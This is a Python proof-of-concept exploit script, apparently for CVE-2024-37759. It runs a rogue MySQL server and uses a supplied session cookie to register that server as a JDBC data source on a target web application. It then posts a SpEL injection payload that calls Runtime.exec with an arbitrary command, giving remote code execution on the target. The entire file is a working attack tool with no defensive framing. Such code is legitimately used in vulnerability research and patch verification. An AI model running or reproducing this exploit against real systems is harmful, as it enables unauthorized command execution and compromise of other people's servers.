import asyncio
import logging
import signal
import random
import requests
signal.signal(signal.SIGINT, signal.SIG_DFL)
from mysqlproto.protocol import start_mysql_server
from mysqlproto.protocol.base import OK, ERR, EOF
from mysqlproto.protocol.flags import Capability
from mysqlproto.protocol.handshake import HandshakeV10, HandshakeResponse41, AuthSwitchRequest
from mysqlproto.protocol.query import ColumnDefinition, ColumnDefinitionList, ResultSet,FileReadPacket
import subprocess
import argparse
import time
import sys
import multiprocessing

def payload(target, host, port, cookie, cmd):
    time.sleep(1)
    sourceId = None
    headers = {"Cookie": "JSESSIONID=%s" % (cookie)}
    saveReq = requests.post('%s/schema/saveAdd' % (target), json = {"dataPermission":-9,"properties":[],"driverEntity":{},"title":"test","url":"jdbc:mysql://%s:%s/test" % (host, port)}, headers = headers)
    if saveReq.json().get("data"):
        sourceId = saveReq.json().get("data").get("id")
    if sourceId != None:
        print("[+] Get schame id: %s" % sourceId)
        print("[+] Start attack")
        response = requests.post(
            '%s/data/%s/evil/view?ppid=pidtest' % (target, sourceId),
            headers=headers,
            json={'name': "#{T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('%s')}" % (cmd)},
        )
        if "ResultSet is from UPDATE" in response.text:
            print("[+] Attack success")
    else:
        print("[x] Failed to get id")

@asyncio.coroutine
def handle_server(server_reader, server_writer):
    handshake = HandshakeV10()
    handshake.write(server_writer)
    yield from server_writer.drain()
    switch2clear=False
    handshake_response = yield from HandshakeResponse41.read(server_reader.packet(), handshake.capability)
    username = handshake_response.user

    if username.endswith(b"_clear"):
        switch2clear = True
        username = username[:-len("_clear")]
    capability = handshake_response.capability_effective

    if (Capability.PLUGIN_AUTH in capability and
            handshake.auth_plugin != handshake_response.auth_plugin
            and switch2clear):

        AuthSwitchRequest().write(server_writer)
        yield from server_writer.drain()
        auth_response = yield from server_reader.packet().read()

    result = OK(capability, handshake.status)
    result.write(server_writer)
    yield from server_writer.drain()

    while True:
        server_writer.reset()
        packet = server_reader.packet()
        try:
            cmd = (yield from packet.read(1))[0]
        except Exception as _:
            return
            pass

        query =(yield from packet.read())
        if query != '':
            query = query.decode('ascii')

        if cmd == 1:
            result =ERR(capability)
        elif cmd == 3:
            if 'SHOW VARIABLES'.lower() in query.lower():
                    ColumnDefinitionList((ColumnDefinition('d'),ColumnDefinition('e'))).write(server_writer)
                    EOF(capability, handshake.status).write(server_writer)
                    ResultSet(("max_allowed_packet","67108864")).write(server_writer)
                    ResultSet(("system_time_zone","UTC")).write(server_writer)
                    ResultSet(("time_zone","SYSTEM")).write(server_writer)
                    ResultSet(("init_connect","")).write(server_writer)
                    ResultSet(("auto_increment_increment","1")).write(server_writer)
                    result = EOF(capability, handshake.status)
            elif 'LOCAL TEMPORARY' in str(query):
                ColumnDefinitionList((ColumnDefinition('table_cat'),ColumnDefinition('table_schem'),ColumnDefinition('TABLE_NAME'),ColumnDefinition('table_type'),ColumnDefinition('remarks'),ColumnDefinition('type_cat'),ColumnDefinition('type_schem'),ColumnDefinition('type_name'),ColumnDefinition('self_referencing_col_name'),ColumnDefinition('ref_generation'))).write(server_writer)
                EOF(capability, handshake.status).write(server_writer)
                ResultSet(('test','NULL','evil','BASE TABLE','','NULL','NULL','NULL','NULL','NULL')).write(server_writer)
                result = EOF(capability, handshake.status)
            elif 'SELECT TABLE_SCHEMA, NULL' in str(query):
                ColumnDefinitionList((ColumnDefinition('TABLE_SCHEMA'), ColumnDefinition('NULL'), ColumnDefinition('TABLE_NAME'), ColumnDefinition('COLUMN_NAME'), ColumnDefinition('data_type'), ColumnDefinition('type_name'), ColumnDefinition('column_size'), ColumnDefinition('buffer_length'), ColumnDefinition('decimal_digits'), ColumnDefinition('num_prec_radix'), ColumnDefinition('nullable'), ColumnDefinition('remarks'), ColumnDefinition('column_def'), ColumnDefinition('sql_data_type'), ColumnDefinition('sql_datetime_sub'), ColumnDefinition('char_octet_length'), ColumnDefinition('ORDINAL_POSITION'), ColumnDefinition('IS_NULLABLE'), ColumnDefinition('scope_catalog'), ColumnDefinition('scope_schema'), ColumnDefinition('scope_table'), ColumnDefinition('source_data_type'), ColumnDefinition('is_autoincrement'), ColumnDefinition('is_generatedcolumn'))).write(server_writer)
                EOF(capability, handshake.status).write(server_writer)
                ResultSet(('test','NULL','evil','name','12','VARCHAR','200','65535','0','10','1','','NULL','0','0','836','1','YES','NULL','NULL','NULL','NULL','no','no')).write(server_writer)
                result = EOF(capability, handshake.status)
            else:
                result = OK(capability, handshake.status)
        else:
            result = OK(capability, handshake.status)

        result.write(server_writer)
        yield from server_writer.drain()


def run_mysql_server():
    loop = asyncio.get_event_loop()
    print("[+] Fake server started")
    f = start_mysql_server(handle_server, host=None, port=3306)
    loop.run_until_complete(f)
    loop.run_forever()
    loop.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2024-37759 PoC')
    parser.add_argument('-t', '--target', required=True, help='Attack target')
    parser.add_argument('-o', '--host', required=True, help='Fake server listen host(public ip)')
    parser.add_argument('-p', '--port', required=True, help='Fake server listen port')
    parser.add_argument('-s', '--session', required=True, help='User session id')
    parser.add_argument('-c', '--cmd', required=True, help='Command to execute')

    args = parser.parse_args()

    multiprocessing.set_start_method('spawn')
    p1 = multiprocessing.Process(target=run_mysql_server)
    p2 = multiprocessing.Process(target=payload, args=(args.target, args.host, args.port, args.session, args.cmd))
    p1.start()
    p2.start()
    p2.join()
    p1.terminate()